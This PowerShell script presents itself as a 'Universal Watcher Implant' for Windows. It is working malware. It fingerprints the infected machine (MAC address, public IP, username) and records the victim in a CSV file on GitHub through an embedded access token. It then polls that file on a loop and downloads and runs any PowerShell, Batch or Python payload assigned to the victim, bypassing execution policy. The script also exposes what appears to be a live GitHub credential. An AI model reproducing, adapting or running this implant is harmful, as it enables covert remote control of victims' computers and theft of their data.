# ===============================================
# UNIVERSAL WATCHER IMPLANT (Windows 7–11)
# Auto-registers victim and executes GitHub payloads
# ===============================================

# === CONFIGURATION SETTINGS ===
$GitHubToken          = "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"  # <- Change this
$RepoOwner            = "Umair13303"
$RepoName             = "DEV_Payload"
$CsvPathInRepo        = "GitHub_Script/Excel/Victim_Record_GitHub.csv"

$GuidFile             = "$env:APPDATA\PRE_ATTACK_GUID.txt"
$RegistryKey          = "HKCU:\Software\Microsoft\Windows\CurrentVersion"
$RegistryValue        = "PRE_ATTACK_GUID_REG_KEY"

$PayloadFolder        = "$env:APPDATA\Payloads"
$LogFile              = "$env:APPDATA\watcher_log.txt"

$FirstWaitSeconds     = 5
$LoopIntervalSeconds  = 15
$UserAgent            = "Watcher-Script"

# === LOGGING FUNCTION ===
function Log-Message {
    param([string]$Text)
    $Text | Out-File -Append $LogFile
    Write-Host $Text
}

# === CREATE PAYLOAD FOLDER AND INITIAL LOG ===
if (-not (Test-Path $PayloadFolder)) {
    New-Item -ItemType Directory -Path $PayloadFolder | Out-Null
}
Log-Message "[$(Get-Date)] === Watcher started ==="

# === LOAD OR CREATE VICTIM GUID ===
$Victim_GUID = ""
try {
    $reg = Get-ItemProperty -Path $RegistryKey -Name $RegistryValue -ErrorAction SilentlyContinue
    if ($reg) { $Victim_GUID = $reg.$RegistryValue }
} catch {}

if (-not $Victim_GUID -or $Victim_GUID -eq "") {
    if (Test-Path $GuidFile) {
        $Victim_GUID = Get-Content -Path $GuidFile -Raw
    }
}
if (-not $Victim_GUID -or $Victim_GUID -eq "") {
    $Victim_GUID = [guid]::NewGuid().ToString()
    Set-ItemProperty -Path $RegistryKey -Name $RegistryValue -Value $Victim_GUID -Force
    $Victim_GUID | Out-File -Encoding UTF8 -FilePath $GuidFile
}
Log-Message "[$(Get-Date)] GUID: $Victim_GUID"

# === INIT WEB CLIENT ===
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("Authorization", "token $GitHubToken")
$wc.Headers.Add("User-Agent", $UserAgent)
$wc.Headers.Add("Accept", "application/vnd.github.v3+json")

# === REGISTER VICTIM IN CSV ===
try {
    $MetaURL = "https://api.github.com/repos/$RepoOwner/$RepoName/contents/$CsvPathInRepo"
    $metaJson = $wc.DownloadString($MetaURL)
    $metaObj = ConvertFrom-Json $metaJson
    $downloadUrl = $metaObj.download_url
    $sha = $metaObj.sha

    $csvText = $wc.DownloadString($downloadUrl)
    $lines = $csvText -split "`r?`n"
    $alreadyExists = $false

    foreach ($line in $lines) {
        if ($line -match "^\d+,") {
            $cols = $line -split ","
            if ($cols[1] -eq $Victim_GUID) {
                $alreadyExists = $true
                break
            }
        }
    }

    if (-not $alreadyExists) {
        $macs = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress }
        $mac  = if ($macs.Count -gt 0) { $macs[0].MACAddress } else { "UNKNOWN" }
        try { $ip = (New-Object Net.WebClient).DownloadString("https://api.ipify.org") } catch { $ip = "UNKNOWN" }
        $user = $env:USERNAME
        $ports = "N/A"

        $lastId = 0
        foreach ($line in $lines) {
            if ($line -match "^\d+,") {
                $id = ($line -split ",")[0]
                if ([int]::TryParse($id, [ref]$null) -and [int]$id -gt $lastId) {
                    $lastId = [int]$id
                }
            }
        }
        $newId = $lastId + 1
        $newRow = "$newId,$Victim_GUID,$mac,$ip,$ports,$user,,,FALSE"

        $allLines = $lines + $newRow
        $finalCsv = ($allLines -join "`n")
        $encoded  = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($finalCsv))

        $body = @{
            message = "Register new victim $newId"
            content = $encoded
            sha     = $sha
        } | ConvertTo-Json -Compress

        $upload = [System.Net.WebRequest]::Create($MetaURL)
        $upload.Method = "PUT"
        $upload.Headers.Add("Authorization", "token $GitHubToken")
        $upload.ContentType = "application/json"
        $upload.UserAgent = $UserAgent
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
        $reqStream = $upload.GetRequestStream()
        $reqStream.Write($bytes, 0, $bytes.Length)
        $reqStream.Close()
        $upload.GetResponse().Close()
    }
}
catch {
    Log-Message "[$(Get-Date)] ❌ Registration failed: $_"
}

# === WAIT BEFORE POLLING ===
Start-Sleep -Seconds $FirstWaitSeconds

# === POLLING LOOP ===
while ($true) {
    try {
        $csvText = $wc.DownloadString($downloadUrl)
        $lines = $csvText -split "`r?`n"
        $foundPayload = $false

        foreach ($line in $lines) {
            if ($line -match "^\d+,") {
                $cols = $line -split ","
                if ($cols[1] -eq $Victim_GUID -and $cols[8].Trim() -eq "TRUE") {
                    $foundPayload = $true
                    $payloadType = $cols[6].Trim()
                    $payloadURL = $cols[7].Trim()

                    $ext = ".txt"
                    if ($payloadType -eq "PowerShell") { $ext = ".ps1" }
                    elseif ($payloadType -eq "Batch") { $ext = ".bat" }
                    elseif ($payloadType -eq "Python") { $ext = ".py" }
                    else {
                        Log-Message "[$(Get-Date)] ⚠️ Unknown payload type: $payloadType"
                        continue
                    }

                    $localPath = Join-Path $PayloadFolder ("payload" + $ext)
                    (New-Object Net.WebClient).DownloadString($payloadURL) | Out-File -Encoding UTF8 -FilePath $localPath

                    if ($payloadType -eq "PowerShell") {
                        Log-Message "[$(Get-Date)] ⚡ Executing PowerShell payload..."
                        powershell -ExecutionPolicy Bypass -File "$localPath"
                    } elseif ($payloadType -eq "Batch") {
                        Log-Message "[$(Get-Date)] ⚡ Executing Batch payload..."
                        Start-Process -FilePath "$localPath"
                    } elseif ($payloadType -eq "Python") {
                        Log-Message "[$(Get-Date)] ⚡ Executing Python payload..."
                        Start-Process -FilePath "python.exe" -ArgumentList "$localPath"
                    }

                    Log-Message "[$(Get-Date)] ✅ Executed $payloadType from $payloadURL"
                }
            }
        }

        if (-not $foundPayload) {
            Log-Message "[$(Get-Date)] ⚠️ No payload assigned."
        }
    }
    catch {
        Log-Message "[$(Get-Date)] ❌ Polling error: $_"
    }
    Start-Sleep -Seconds $LoopIntervalSeconds
}
